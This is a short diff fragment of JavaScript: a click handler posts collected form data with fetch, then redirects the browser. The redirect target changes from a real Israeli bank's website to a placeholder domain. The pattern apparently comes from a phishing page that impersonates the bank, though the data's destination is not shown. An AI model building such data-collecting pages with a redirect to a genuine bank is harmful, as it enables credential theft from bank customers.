@@ -153,7 +153,7 @@ but.addEventListener("click" , async function(e){
   body: JSON.stringify(sentData)
 });
 
-window.location.href = 'https://www.bankhapoalim.co.il/';
+window.location.href = 'https://www.legitimic-website.co.il/';
 })
 
 
